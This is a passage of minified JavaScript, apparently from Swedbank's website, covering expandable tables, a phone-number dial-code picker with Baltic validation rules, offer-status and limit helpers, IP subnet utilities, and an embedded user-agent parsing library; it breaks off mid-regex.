0!==rowspan&&!1!==rowspan&&"1"!=rowspan&&($td.attr("rowspan",rowspan),rowspan=parseInt(rowspan),spanrows=rowspan),(0==spanrows||spanrows==rowspan&&"1"!=rowspan)&&$row.append($td.addClass("expander")),spanrows>0&&spanrows--}$("td:first-child",$row).attr("rowspan")||$row.next().hasClass("extra-row")||($row.find(".expander-button").remove(),$row.addClass("static-row"))}}))}function toggleRow(el,$table){var $row=$(el,$table).closest("tr");if(1===$row.parents("table").length)if($row.hasClass("open-row"))$("tr",$table).removeClass("open-row");else{if($("tr",$table).removeClass("open-row"),$row.next(".extra-row",$table).length>0)var $hiddenContent=$row.nextUntil(".static-row, .row-expand",$table);else $hiddenContent=$row.nextUntil(".row-expand",$table);$.each(getRows($row),(function(i,$row){$row.addClass("open-row")})),Swedbank.Viewport.isMobile()&&$row.scrollTo("slow",-60),$row.nextUntil($hiddenContent).addBack().add($hiddenContent).addClass("open-row").removeAttr("style")}}function getRows($tr){var rows=[],$tbody=$tr.parent(),index=$tr.index(),rowspan=0;if($tr.hasClass("extra-row")||$("td:first-child",$tr).attr("rowspan")>1)var $row=$tr;else $row=$tr.prevAll("tr").filter((function(){return $("td:first-child",this).attr("rowspan")>1}));var rindex=$row.index();if($row.each((function(index){0==index&&(rowspan=$(this).find("td[rowspan]").attr("rowspan")||0)})),1==(rowspan=parseInt(rowspan))&&(rowspan=0),index>rindex+rowspan)rows.push($tr);else for(var i=0;i<rowspan;i++)rows.push($("tr:eq("+(rindex+i)+")",$tbody));return rows}$(".expander-button",$table).each((function(){$(this).parents("tr").addClass("row-expand")})),$("tr:not(.extra-row, .sub-header-row, .totals, .total-row, .static-row)",$table).on("click",(function(e){"A"!=e.target.nodeName&&"INPUT"!=e.target.nodeName&&"TH"!=e.target.nodeName&&"SPAN"!=e.target.nodeName&&toggleRow(this,$table)})),$(".expander-button",$table).on("click",(function(){toggleRow(this,$table)})),$("td",$table).on("mouseenter",(function(){var $tr=$(this).parent();$tr.isInside("tfoot")||$.each(getRows($tr),(function(i,$row){$row.hasClass("row-expand")&&($row.addClass("hover"),$row.nextUntil(".extra-row").addClass("hover"))}))})).on("mouseleave",(function(){$("tr",$table).removeClass("hover")}))}))},DataTable.createExpandableComparisonTable=function(){$(".comparison-table.-expandable").length&&$(".comparison-table.-expandable:not(.comparison-table-expandable-enabled)").each((function(){var $table=$(this).addClass("comparison-table-expandable-enabled");$(".row-expand",$table).each((function(){$row=$(this).addClass("open-row"),$("th:last-child, td:last-child",$row).append('<span class="expander-button" />')})),$(".expander-button",$table).on("click",(function(){toggleRow(this,$table)})),toggleRow=function(button,$table){$row=$(button).parents("tr",$table),$row.hasClass("open-row")?($row.removeClass("open-row"),$row.nextUntil(".row-expand").addClass("-hidden")):($row.addClass("open-row"),$row.nextUntil(".row-expand").removeClass("-hidden"),Swedbank.Viewport.isMobile()&&$row.scrollTo("slow",-60))}}))},DataTable.processComparisonTable=function(){$(".comparison-table").length&&$(".comparison-table").each((function(){var $table=$(this);$table.parent().parent().hasClass("responsive-table-container")?$table.parent().parent().addClass("container"):$table.parent().hasClass("responsive-table-wrapper")?$table.parent().addClass("container"):$table.wrap('<div class="container"/>')}))},DataTable.loadCallback=()=>{$(DataTable.createExpandableTable),$(DataTable.createExpandableComparisonTable),$(DataTable.processComparisonTable),$("table.dataTable").each(DataTable.autoAlign),DataTable.initiateCheckBoxSelection()}}(jQuery),Swedbank.isUiSpaEnabled?(SharedComponents.eventBus.addEventListener("spa-navigation-complete",DataTable.loadCallback),UI.whenDOMReady(DataTable.loadCallback)):Swedbank.PageLoad.onEach(DataTable.loadCallback);var Swedbank=Swedbank||{};Swedbank.events=Swedbank.events||(jQuery,void jQuery(document).on("messageReceivedEvent",(function(event,triggerParam){"USER_NOTIFICATION"===triggerParam.messageType?UI.dispatchCustomEvent(document,"notifications-update",triggerParam):"CHAT_MESSAGE"===triggerParam.messageType?jQuery(document).trigger("chatMessageEvent",[triggerParam]):"KNOCK_MESSAGE"===triggerParam.messageType&&jQuery(document).trigger("knockMessageEvent",[triggerParam])}))),function($){var countries,cachedNumbers={};function getCountry(identification){return countries.filter((function(country){return $.isNumeric(identification)?Number(country.dialCode)==Number(identification):country.iso2==identification}))[0]}function createDialCodeMarkup(country){return'<div class="dial-flag '+country.iso2+'"/><span class="dial-code"> +'+country.dialCode+"</span>"}function PhoneField(field){this.$=$(field),this.options=$.extend({dialCodePicker:!0,dialCodeField:"",valueWithDialCode:!0},this.$.data()),this.picker=new DialCodePicker(this.$,this.options),this.createValueTrackingField(),this.validateOnChange(),this.$.trigger("change")}function DialCodeList(){var self=this;this.$list=$('<ul class="dial-code-list">').prependTo("body"),this.$list.data("instance",this),countries.forEach(this.addCountryOption,this),this.keyboardTracker(),$("body").untilUnload("click",(function(event){self.$list.find(event.target).length||$(event.target).is(".dial-code-picker, .dial-code-picker *")||self.close()}))}function DialCodePicker($input,options){var self=this;this.$input=$input,this.$=$('<div class="dial-code-picker">').insertBefore($input),this.selectedCountry=null;var currentCountry=new PhoneNumber($input.val()).getCountry();void 0!==currentCountry&&this.select(currentCountry),options.dialCodePicker&&1!=this.getAllowedCountries().length?this.$.addClass("dial-code-selection-enabled").click((function(){var dropdown=new DialCodeList;dropdown.picker=self,dropdown.positionBy(self.$),dropdown.$list.is(":hidden")||dropdown.picker!==self?dropdown.open(self.getAllowedCountries()):dropdown.close()})):this.$.addClass("dial-code-selection-disabled")}window.PhoneNumber=function(number){cachedNumbers[number]?$.extend(this,cachedNumbers[number]):(this.number=number,cachedNumbers[number]=this)},PhoneNumber.prototype.clean=function(removePlusCharacter){var cleanedNumber=this.number.replace(/[^0-9+]/g,"");return removePlusCharacter&&(cleanedNumber=cleanedNumber.replace(/^(\+|00)/,"")),cleanedNumber},PhoneNumber.prototype.getDialCode=function(){var dialCode;if(this.hasDialCode())for(var number=this.clean(!0),i=4;i>0&&!getCountry(dialCode);)dialCode=number.substr(0,i),i--;return dialCode||function getLocalDialCode(){return{EE:372,LV:371,LT:370}[Swedbank.country]}()},PhoneNumber.prototype.getCountry=function(){if(!this.country){var dialCode=this.getDialCode();this.country=getCountry(1==dialCode?this.isCanadian()?"ca":"us":dialCode)}return this.country},PhoneNumber.prototype.getLocalNumber=function(){var country=this.getCountry();return this.hasDialCode()&&void 0!==country?this.clean(!0).substr(country.dialCode.length):this.number},PhoneNumber.prototype.hasDialCode=function(){return/^(\+{1,4}|00)/.test(this.clean())},PhoneNumber.prototype.validate=function(){var errorLabel,validationRules={ee:{length:[7,8],firstDigitRange:[3,9]},lv:{length:[8,8],firstDigitRange:[2,6]},lt:{length:[8,8],firstDigitRange:[2,8]},default:{length:[6,12],firstDigitRange:[1,9]}},ruleSet=validationRules[this.getCountry().iso2]||validationRules.default,localNumber=this.getLocalNumber();return Number(localNumber)||(errorLabel="phoneNumberInvalid"),(localNumber.length<ruleSet.length[0]||localNumber.length>ruleSet.length[1])&&(errorLabel="phoneNumberWrongLength"),localNumber[0]&&(localNumber[0]<ruleSet.firstDigitRange[0]||localNumber[0]>ruleSet.firstDigitRange[1])&&(errorLabel="phoneNumberWrongFirstDigit"),Swedbank.Labels(errorLabel)||!0},PhoneNumber.prototype.getAreaCode=function(){var number=this.clean(!0);return Number(number.substr(1,3))},PhoneNumber.prototype.isCanadian=function(){return[403,587,780,250,604,778,236,204,431,506,709,902,782,226,249,289,343,365,416,437,519,613,647,705,807,905,418,438,450,514,579,581,819,873,306,639,867].includes(this.getAreaCode())},PhoneField.prototype.createValueTrackingField=function(){var self=this;this.$trackerField=$("<input/>",{name:this.$.attr("name"),type:"hidden"}).insertAfter(this.$),this.$.removeAttr("name").on("change keyup paste",(function(){var country,number=new PhoneNumber(this.value);void 0!==(country=number.hasDialCode()?number.getCountry():self.$trackerField.val()?new PhoneNumber(self.$trackerField.val()).getCountry():self.picker.selectedCountry)&&self.updateValue(country.dialCode)})),this.picker.$.on("dialcodechange",(function(event,country){self.updateValue(country.dialCode)}))},PhoneField.prototype.updateValue=function(dialCode){var self=this,localNumber=new PhoneNumber(self.$.val()).getLocalNumber();self.$trackerField.val((function(){return self.options.valueWithDialCode&&localNumber?"+"+dialCode+localNumber:localNumber})).trigger("change")},PhoneField.prototype.validateOnChange=function(){var self=this;self.hasBeenEdited=!1,self.$.on("change",(function(){var number=new PhoneNumber(self.$trackerField.val()),country=number.getCountry();if(number.number&&(this.value=number.getLocalNumber()),self.picker.select(country),self.hasBeenEdited){var validationResult=number.validate();setTimeout((function(){self.$.trigger("validationchange",[!0===validationResult,validationResult])}),100)}self.hasBeenEdited=!0}))},DialCodeList.prototype.addCountryOption=function(country){var self=this;country.$=$("<li>",{text:country.name}).appendTo(this.$list),country.$.prepend(createDialCodeMarkup(country)),country.$.on("click",(function(){self.picker.select(country),self.close()}))},DialCodeList.prototype.open=function(allowedCountries){var selectedCountry=this.picker.selectedCountry;(allowedCountries=allowedCountries||[]).length?($(".dial-code-list > li").hide(),allowedCountries.forEach((function(country){$(".dial-code-list > li:has(."+country+")").show()}))):$(".dial-code-list > li").show(),this.$list.show(),this.$list.css("z-index",this.picker.$.getZIndex()+10),null!=selectedCountry.$&&(selectedCountry.$.siblings(".active").removeClass("active"),selectedCountry.$.addClass("active"),this.scrollTo(selectedCountry.$))},DialCodeList.prototype.close=function(){this.$list.remove()},DialCodeList.prototype.keyboardTracker=function(){var characterResetTimeout,self=this,enteredCharacters="";$(document).untilUnload("keypress",(function(event){if(self.$list.is(":visible")){var character=String.fromCharCode(event.which).toLowerCase();enteredCharacters+=character;var matchedCountries=countries.filter((function(country){return country.name.toLowerCase().startsWith(enteredCharacters)||country.dialCode==enteredCharacters}));clearTimeout(characterResetTimeout),characterResetTimeout=setTimeout((function(){enteredCharacters=""}),1800),matchedCountries.length&&self.scrollTo(matchedCountries.first().$,"fast")}}))},DialCodeList.prototype.scrollTo=function($target,scrollDuration){this.$list.animate({scrollTop:$target.position().top+this.$list.scrollTop()},scrollDuration||0)},DialCodeList.prototype.positionBy=function($field){this.picker.$.is(".modal-window *")||this.picker.$.is("#bankOfferContentHtml *")||this.picker.$.is(".ui-modal__window *")?this.$list.css({position:"fixed",top:$field.offsetInViewport().top+$field.outerHeight(),left:$field.offset().left}):this.$list.css({top:$field.offset().top+$field.outerHeight(),left:$field.offset().left})},DialCodePicker.prototype.getAllowedCountries=function(){var allowedCountries=[];return this.$input.data("allowedCountries")&&(allowedCountries=this.$input.data("allowedCountries").toLowerCase().split(",")),allowedCountries},DialCodePicker.prototype.select=function(country){this.$.html(createDialCodeMarkup(country)),this.selectedCountry=country,this.$.trigger("dialcodechange",country)},$.fn.addDialCodePicker=function(){var $fields=this;return $fields.length&&Swedbank.Countries.fetch().then((countryData=>{countries=function sortByRelevantCountries(countries){var countryOrder=["ee","lv","lt","ru","fi","se"];if(null!=(currentCountry=Swedbank.country))var currentCountry=Swedbank.country.toLowerCase();return countryOrder.splice(0,0,countryOrder.splice(countryOrder.indexOf(currentCountry),1)[0]),countryOrder.forEach((function(code,codeIndex){var countryIndex;countries.forEach((function(country,index){country.iso2==code&&(countryIndex=index)})),countries.splice(codeIndex,0,countries.splice(countryIndex,1)[0])})),countries}(countryData),$fields.each((function(){try{new PhoneField(this)}catch(e){}}))})),this},$.fn.removeDialCodePicker=function(){return this.length&&this.each((function(){$(this).find("input.phone-field").each((function(){var $input=$(this);$input.prev().hasClass("dial-code-picker")&&($input.unbind("click"),$input.attr("name",$input.next().attr("name")),$(this).prev().remove(),$(this).next().remove())}))})),this};const legacyDialCodePickerInit=()=>{requestAnimationFrame((()=>{jQuery("#mainForm").find("input.phone-field").addDialCodePicker()}))};Swedbank.isUiSpaEnabled?(SharedComponents.eventBus.addEventListener("spa-navigation-complete",legacyDialCodePickerInit),legacyDialCodePickerInit()):Swedbank.PageLoad.onEach(legacyDialCodePickerInit),Swedbank.PageLoad.onFirst((function(){$("body").on("validationchange",".phone-field",(function(event,isValid,validationResult){var $field=$(this);event.isDefaultPrevented()||($field.next(".validation-message").remove(),isValid?$field.parents("dd,div:first").removeClass("validation-error"):($field.parents("dd,div:first").addClass("validation-error"),$field.after('<div class="validation-message">'+validationResult+"</div>")))}))}))}(jQuery),(Swedbank.Offers={}).sendStatus=function(bankOfferUniqueId,status,cbOrPageId,comment){var callback,offerDetailPageId="";callback="string"==typeof cbOrPageId?function(){Swedbank.Navigation.goTo(cbOrPageId)}:"function"!=typeof cbOrPageId?function(){}:cbOrPageId,Swedbank.Navigation.isPrivate()&&(offerDetailPageId="private.home.important.offers.offerdetail"),Swedbank.Navigation.isBusiness()&&(offerDetailPageId="business.useful.offerdetail"),$("navForm").request({parameters:{pageId:offerDetailPageId,offerUniqueId:bankOfferUniqueId},onComplete:function(response){$("navForm").request({parameters:{pageId:offerDetailPageId,field1:"answer_bank",value1:"true",field2:"answerType",value2:status,commentBox:comment||"Plačiau"},onComplete:callback})}})},function(){var Limits=Swedbank.Limits={};Limits.limit=[],Limits.addLimit=function(limitId,limit){Limits.limit[limitId]=parseInt(limit)},Limits.getLimit=function(limitId){return void 0===Limits.limit[limitId]?0:Limits.limit[limitId]},Limits.hasLimit=function(limitId){return Limits.getLimit(limitId)>0},Limits.link=function(limitId,url1,url2){return Limits.hasLimit(limitId)?url1:url2}}(),Swedbank.Network={ipToLong:function(ip){var numeric=ip.split(".");return 256*(256*(256*+numeric[0]+ +numeric[1])+ +numeric[2])+ +numeric[3]},longToIp:function(numeric){for(var ip=numeric%256,i=3;i>0;i--)ip=(numeric=Math.floor(numeric/256))%256+"."+ip;return ip},isInSubnet:function(ip,ipOrMask){var parts=(ipOrMask||"").split("/");if(1==parts.length)return ip==ipOrMask;var maskIp=Swedbank.Network.ipToLong(parts[0]),ipNumber=Swedbank.Network.ipToLong(ip),freedom=Math.pow(2,32-parseInt(parts[1]));return ipNumber>maskIp&&ipNumber<maskIp+freedom-1}};var spoilersLoadCallback=()=>{document.querySelectorAll(".offer").forEach((offer=>{if(offer.classList.contains("-force-no-spoiler"))return;const article=offer.querySelector("article");if(article&&!article.querySelector(".spoiler")){const children=(article=>{const heading=article.querySelector("h3");let siblings=[];if(heading&&article.querySelector(".form-button-bar",".disclaimer")){let elem=heading.nextElementSibling;for(;elem&&!elem.matches(".form-button-bar, .disclaimer");)siblings.push(elem),elem=elem.nextElementSibling,elem.parentNode.removeChild(elem.previousElementSibling)}return siblings})(article);if(!children.length)return;const spoiler=UI.createElement({tagName:"ui-curtain",attributes:{layout:"spoiler",mobile:"mobile"},children:children});article.insertBefore(spoiler,article.querySelector("h3").nextElementSibling)}}))};Swedbank.isUiSpaEnabled?(SharedComponents.eventBus.addEventListener("spa-navigation-complete",spoilersLoadCallback),UI.whenDOMReady(spoilersLoadCallback)):Swedbank.PageLoad.onEach(spoilersLoadCallback);var menuResetCallback=()=>{const mainNav=document.querySelector("ui-nav#nav-main");window.matchMedia("(min-width: 1024px)").matches&&mainNav&&mainNav.close(),UI.dispatchCustomEvent(document.body,"menu-toggle",{active:!1,group:"navigation"})};Swedbank.isUiSpaEnabled?(SharedComponents.eventBus.addEventListener("spa-navigation-complete",menuResetCallback),UI.whenDOMReady(menuResetCallback)):Swedbank.PageLoad.onEachUnload(menuResetCallback),function(l,g){var r=function(a){for(var d={},c=0;c<a.length;c++)d[a[c].toUpperCase()]=a[c];return d},x=function(a,d){return"string"==typeof a&&-1!==p(d).indexOf(p(a))},p=function(a){return a.toLowerCase()},v=function(a,d){if("string"==typeof a)return a=a.replace(/^\s\s*/,"").replace(/\s\s*$/,""),void 0===d?a:a.substring(0,255)},q=function(a,d){for(var f,b,m,e,t,k,c=0;c<d.length&&!t;){var y=d[c],z=d[c+1];for(f=b=0;f<y.length&&!t;)if(t=y[f++].exec(a))for(m=0;m<z.length;m++)k=t[++b],"object"==typeof(e=z[m])&&0<e.length?2===e.length?this[e[0]]="function"==typeof e[1]?e[1].call(this,k):e[1]:3===e.length?this[e[0]]="function"!=typeof e[1]||e[1].exec&&e[1].test?k?k.replace(e[1],e[2]):g:k?e[1].call(this,k,e[2]):g:4===e.length&&(this[e[0]]=k?e[3].call(this,k.replace(e[1],e[2])):g):this[e]=k||g;c+=2}},w=function(a,d){for(var c in d)if("object"==typeof d[c]&&0<d[c].length){for(var f=0;f<d[c].length;f++)if(x(d[c][f],a))return"?"===c?g:c}else if(x(d[c],a))return"?"===c?g:c;return a},A={ME:"4.90","NT 3.11":"NT3.51","NT 4.0":"NT4.0",2e3:"NT 5.0",XP:["NT 5.1","NT 5.2"],Vista:"NT 6.0",7:"NT 6.1",8:"NT 6.2",8.1:"NT 6.3",10:["NT 6.4","NT 10.0"],RT:"ARM"},B={browser:[[/\b(?:crmo|crios)\/([\w\.]+)/i],["version",["name","Chrome"]],[/edg(?:e|ios|a)?\/([\w\.]+)/i],["version",["name","Edge"]],[/(opera mini)\/([-\w\.]+)/i,/(opera [mobiletab]{3,6})\b.+version\/([-\w\.]+)/i,/(opera)(?:.+version\/|[\/ ]+)([\w\.]+)/i],["name","version"],[/opios[\/ ]+([\w\.]+)/i],["version",["name","Opera Mini"]],[/\bopr\/([\w\.]+)/i],["version",["name","Opera"]],[/(kindle)\/([\w\.]+)/i,/(lunascape|maxthon|netfront|jasmine|blazer)[\/ ]?([\w\.]*)/i,/(avant |iemobile|slim)(?:browser)?[\/ ]?([\w\.]*)/i,/(ba?idubrowser)[\/ ]?([\w\.]+)/i,/(?:ms|\()(ie) ([\w\.]+)/i,/(flock|rockmelt|midori|epiphany|silk|skyfire|ovibrowser|bolt|iron|vivaldi|iridium|phantomjs|bowser|quark|qupzilla|falkon|rekonq|puffin|brave|whale|qqbrowserlite|qq)\/([-\w\.]+)/i,/(weibo)__([\d\.]+)/i],["name","version"],[/(?:\buc? ?browser|(?:juc.+)ucweb)[\/ ]?([\w\.]+)/i],["version",["name","UCBrowser"]],[/\bqbcore\/([\w\.]+)/i],["version",["name","WeChat(Win) Desktop"]],[/micromessenger\/([\w\.]+)/i],["version",["name","WeChat"]],[/konqueror\/([\w\.]+)/i],["version",["name","Konqueror"]],[/trident.+rv[: ]([\w\.]{1,9})\b.+like gecko/i],["version",["name","IE"]],[/yabrowser\/([\w\.]+)/i],["version",["name","Yandex"]],[/(avast|avg)\/([\w\.]+)/i],[["name",/(.+)/,"$1 Secure Browser"],"version"],[/\bfocus\/([\w\.]+)/i],["version",["name","Firefox Focus"]],[/\bopt\/([\w\.]+)/i],["version",["name","Opera Touch"]],[/coc_coc\w+\/([\w\.]+)/i],["version",["name","Coc Coc"]],[/dolfin\/([\w\.]+)/i],["version",["name","Dolphin"]],[/coast\/([\w\.]+)/i],["version",["name","Opera Coast"]],[/miuibrowser\/([\w\.]+)/i],["version",["name","MIUI Browser"]],[/fxios\/([-\w\.]+)/i],["version",["name","Firefox"]],[/\bqihu|(qi?ho?o?|360)browser/i],[["name","360 Browser"]],[/(oculus|samsung|sailfish)browser\/([\w\.]+)/i],[["name",/(.+)/,"$1 Browser"],"version"],[/(comodo_dragon)\/([\w\.]+)/i],[["name",/_/g," "],"version"],[/(electron)\/([\w\.]+) safari/i,/(tesla)(?: qtcarbrowser|\/(20\d\d\.[-\w\.]+))/i,/m?(qqbrowser|baiduboxapp|2345Explorer)[\/ ]?([\w\.]+)/i],["name","version"],[/(metasr)[\/ ]?([\w\.]+)/i,/(lbbrowser)/i],["name"],[/((?:fban\/fbios|fb_iab\/fb4a)(?!.+fbav)|;fbav\/([\w\.]+);)/i],[["name","Facebook"],"version"],[/safari (line)\/([\w\.]+)/i,/\b(line)\/([\w\.]+)\/iab/i,/(chromium|instagram)[\/ ]([-\w\.]+)/i],["name","version"],[/\bgsa\/([\w\.]+) .*safari\//i],["version",["name","GSA"]],[/headlesschrome(?:\/([\w\.]+)| )/i],["version",["name","Chrome Headless"]],[/ wv\).+(chrome)\/([\w\.]+)/i],[["name","Chrome WebView"],"version"],[/droid.+ version\/([\w\.]+)\b.+(?:mobile safari|safari)/i],["version",["name","Android Browser"]],[/(chrome|omniweb|arora|[tizenoka]{5} ?browser)\/v?([\w\.]+)/i],["name","version"],[/version\/([\w\.]+) .*mobile\/\w+ (safari)/i],["version",["name","Mobile Safari"]],[/version\/([\w\.]+) .*(mobile ?safari|safari)/i],["version","name"],[/webkit.+?(mobile ?safari|safari)(\/[\w\.]+)/i],["name",["version",w,{"1.0":"/8",1.2:"/1",1.3:"/3","2.0":"/412","2.0.2":"/416","2.0.3":"/417","2.0.4":"/419","?":"/"}]],[/(webkit|khtml)\/([\w\.]+)/i],["name","version"],[/(navigator|netscape\d?)\/([-\w\.]+)/i],[["name","Netscape"],"version"],[/mobile vr; rv:([\w\.]+)\).+firefox/i],["version",["name","Firefox Reality"]],[/ekiohf.+(flow)\/([\w\.]+)/i,/(swiftfox)/i,/(icedragon|iceweasel|camino|chimera|fennec|maemo browser|minimo|conkeror|klar)[\/ ]?([\w\.\+]+)/i,/(seamonkey|k-meleon|icecat|iceape|firebird|phoenix|palemoon|basilisk|waterfox)\/([-\w\.]+)$/i,/(firefox)\/([\w\.]+)/i,/(mozilla)\/([\w\.]+) .+rv:.+gecko\/\d+/i,/(polaris|lynx|dillo|icab|doris|amaya|w3m|netsurf|sleipnir|obigo|mosaic|(?:go|ice|up)[\. ]?browser)[-\/ ]?v?([\w\.]+)/i,/(links) \(([\w\.]+)/i],["name","version"]],cpu:[[/(?:(amd|x(?:(?:86|64)[-_])?|wow|win)64)[;\)]/i],[["architecture","amd64"]],[/(ia32(?=;))/i],[["architecture",p]],[/((?:i[346]|x)86)[;\)]/i],[["architecture","ia32"]],[/\b(aarch64|arm(v?8e?l?|_?64))\b/i],[["architecture","arm64"]],[/\b(arm(?:v[67])?ht?n?[fl]p?)\b/i],[["architecture","armhf"]],[/windows (ce|mobile); ppc;/i],[["architecture","arm"]],[/((?:ppc|powerpc)(?:64)?)(?: mac|;|\))/i],[["architecture",/ower/,"",p]],[/(sun4\w)[;\)]/i],[["architecture","sparc"]],[/((?:avr32|ia64(?=;))|68k(?=\))|\barm(?=v(?:[1-7]|[5-7]1)l?|;|eabi)|(?=atmel )avr|(?:irix|mips|sparc)(?:64)?\b|pa-risc)/i],[["architecture",p]]],device:[[/\b(sch-i[89]0\d|shw-m380s|sm-[pt]\w{2,4}|gt-[pn]\d{2,4}|sgh-t8[56]9|nexus 10)/i],["model",["vendor","Samsung"],["type","tablet"]],[/\b((?:s[cgp]h|gt|sm)-\w+|galaxy nexus)/i,/samsung[- ]([-\w]+)/i,/sec-(sgh\w+)/i],["model",["vendor","Samsung"],["type","mobile"]],[/\((ip(?:hone|od)[\w ]*);/i],["model",["vendor","Apple"],["type","mobile"]],[/\((ipad);[-\w\),; ]+apple/i,/applecoremedia\/[\w\.]+ \((ipad)/i,/\b(ipad)\d\d?,\d\d?[;\]].+ios/i],["model",["vendor","Apple"],["type","tablet"]],[/\b((?:ag[rs][23]?|bah2?|sht?|btv)-a?[lw]\d{2})\b(?!.+d\/s)/i],["model",["vendor","Huawei"],["type","tablet"]],[/(?:huawei|honor)([-\w ]+)[;\)]/i,/\b(nexus 6p|\w{2,4}-[atu]?[ln][01259x][012359][an]?)\b(?!.+d\/s)/i],["model",["vendor","Huawei"],["type","mobile"]],[/\b(poco[\w ]+)(?: bui|\))/i,/\b; (\w+) build\/hm\1/i,/\b(hm[-_ ]?note?[_ ]?(?:\d\w)?) bui/i,/\b(redmi[\-_ ]?(?:note|k)?[\w_ ]+)(?: bui|\))/i,/\b(mi[-_ ]?(?:a\d|one|one[_ ]plus|note lte|max)?[_ ]?(?:\d?\w?)[_ ]?(?:plus|se|lite)?)(?: bui|\))/i],[["model",/_/g," "],["vendor","Xiaomi"],["type","mobile"]],[/\b(mi[-_ ]?(?:pad)(?:[\w_ ]+))(?: bui|\))/i],[["model",/_/g," "],["vendor","Xiaomi"],["type","tablet"]],[/; (\w+) bui.+ oppo/i,/\b(cph[12]\d{3}|p(?:af|c[al]|d\w|e[ar])[mt]\d0|x9007|a101op)\b/i],["model",["vendor","OPPO"],["type","mobile"]],[/vivo (\w+)(?: bui|\))/i,/\b(v[12]\d{3}\w?[at])(?: bui|;)/i],["model",["vendor","Vivo"],["type","mobile"]],[/\b(rmx[12]\d{3})(?: bui|;|\))/i],["model",["vendor","Realme"],["type","mobile"]],[/\b(milestone|droid(?:[2-4x]| (?:bionic|x2|pro|razr))?:?( 4g)?)\b[\w ]+build\//i,/\bmot(?:orola)?[- ](\w*)/i,/((?:moto[\w\(\) ]+|xt\d{3,4}|nexus 6)(?= bui|\)))/i],["model",["vendor","Motorola"],["type","mobile"]],[/\b(mz60\d|xoom[2 ]{0,2}) build\//i],["model",["vendor","Motorola"],["type","tablet"]],[/((?=lg)?[vl]k\-?\d{3}) bui| 3\.[-\w; ]{10}lg?-([06cv9]{3,4})/i],["model",["vendor","LG"],["type","tablet"]],[/(lm(?:-?f100[nv]?|-[\w\.]+)(?= bui|\))|nexus [45])/i,/\blg[-e;\/ ]+((?!browser|netcast|android tv)\w+)/i,/\blg-?([\d\w]+) bui/i],["model",["vendor","LG"],["type","mobile"]],[/(ideatab[-\w ]+)/i,/lenovo ?(s[56]000[-\w]+|tab(?:[\w ]+)|yt[-\d\w]{6}|tb[-\d\w]{6})/i],["model",["vendor","Lenovo"],["type","tablet"]],[/(?:maemo|nokia).*(n900|lumia \d+)/i,/nokia[-_ ]?([-\w\.]*)/i],[["model",/_/g," "],["vendor","Nokia"],["type","mobile"]],[/(pixel c)\b/i],["model",["vendor","Google"],["type","tablet"]],[/droid.+; (pixel[\daxl ]{0,6})(?: bui|\))/i],["model",["vendor","Google"],["type","mobile"]],[/droid.+ ([c-g]\d{4}|so[-gl]\w+|xq-a\w[4-7][12])(?= bui|\).+chrome\/(?![1-6]{0,1}\d\.))/i],["model",["vendor","Sony"],["type","mobile"]],[/sony tablet [ps]/i,/\b(?:sony)?sgp\w+(?: bui|\))/i],[["model","Xperia Tablet"],["vendor","Sony"],["type","tablet"]],[/ (kb2005|in20[12]5|be20[12][59])\b/i,/(?:one)?(?:plus)? (a\d0\d\d)(?: b|\))/i],["model",["vendor","OnePlus"],["type","mobile"]],[/(alexa)webm/i,/(kf[a-z]{2}wi)( bui|\))/i,/(kf[a-z]+)( bui|\)).+silk\//i],["model",["vendor","Amazon"],["type","tablet"]],[/((?:sd|kf)[0349hijorstuw]+)( bui|\)).+silk\//i],[["model",/(.+)/g,"Fire Phone $1"],["vendor","Amazon"],["type","mobile"]],[/(playbook);[-\w\),; ]+(rim)/i],["model","vendor",["type","tablet"]],[/\b((?:bb[a-f]|st[hv])100-\d)/i,/\(bb10; (\w+)/i],["model",["vendor","BlackBerry"],["type","mobile"]],[/(?:\b|asus_)(transfo[prime ]{4,10} \w+|eeepc|slider \w+|nexus 7|padfone|p00[cj])/i],["model",["vendor","ASUS"],["type","tablet"]],[/ (z[bes]6[027][012][km][ls]|zenfone \d\w?)\b/i],["model",["vendor","ASUS"],["type","mobile"]],[/(nexus 9)/i],["model",["vendor","HTC"],["type","tablet"]],[/(htc)[-;_ ]{1,2}([\w ]+(?=\)| bui)|\w+)/i,/(zte)[- ]([\w ]+?)(?: bui|\/|\))/i,/(alcatel|geeksphone|nexian|panasonic|sony)[-_ ]?([-\w]*)/i],["vendor",["model",/_/g," "],["type","mobile"]],[/droid.+; ([ab][1-7]-?[0178a]\d\d?)/i],["model",["vendor","Acer"],["type","tablet"]],[/droid.+; (m[1-5] note) bui/i,/\bmz-([-\w]{2,})/i],["model",["vendor","Meizu"],["type","mobile"]],[/\b(sh-?[altvz]?\d\d[a-ekm]?)/i],["model",["vendor","Sharp"],["type","mobile"]],[/(blackberry|benq|palm(?=\-)|sonyericsson|acer|asus|dell|meizu|motorola|polytron)[-_ ]?([-\w]*)/i,/(hp) ([\w ]+\w)/i,/(asus)-?(\w+)/i,/(microsoft); (lumia[\w ]+)/i,/(lenovo)[-_ ]?([-\w]+)/i,/(jolla)/i,/(oppo) ?([\w ]+) bui/i],["vendor","model",["type","mobile"]],[/(archos) (gamepad2?)/i,/(hp).+(touchpad(?!.+tablet)|tablet)/i,/(kindle)\/([\w\.]+)/i,/(nook)[\w ]+build\/(\w+)/i,/(dell) (strea[kpr\d ]*[\dko])/i,/(le[- ]+pan)[- ]+(\w{1,9}) bui/i,/(trinity)[- ]*(t\d{3}) bui/i,/(gigaset)[- ]+(q\w{1,9}) bui/i,/(vodafone) ([\w ]+)(?:\)| bui)/i],["vendor","model",["type","tablet"]],[/(surface duo)/i],["model",["vendor","Microsoft"],["type","tablet"]],[/droid [\d\.]+; (fp\du?)(?: b|\))/i],["model",["vendor","Fairphone"],["type","mobile"]],[/(u304aa)/i],["model",["vendor","AT&T"],["type","mobile"]],[/\bsie-(\w*)/i],["model",["vendor","Siemens"],["type","mobile"]],[/\b(rct\w+) b/i],["model",["vendor","RCA"],["type","tablet"]],[/\b(venue[\d ]{2,7}) b/i],["model",["vendor","Dell"],["type","tablet"]],[/\b(q(?:mv|ta)\w+) b/i],["model",["vendor","Verizon"],["type","tablet"]],[/\b(?:barnes[& ]+noble |bn[rt])([\w\+ ]*) b/i],["model",["vendor","Barnes & Noble"],["type","tablet"]],[/\b(tm\d{3}\w+) b/i],["model",["vendor","NuVision"],["type","tablet"]],[/\b(k88) b/i],["model",["vendor","ZTE"],["type","tablet"]],[/\b(nx\d{3}j) b/i],["model",["vendor","ZTE"],["type","mobile"]],[/\b(gen\d{3}) b.+49h/i],["model",["vendor","Swiss"],["type","mobile"]],[/\b(zur\d{3}) b/i],["model",["vendor","Swiss"],["type","tablet"]],[/\b((zeki)?tb.*\b) b/i],["model",["vendor","Zeki"],["type","tablet"]],[/\b([yr]\d{2}) 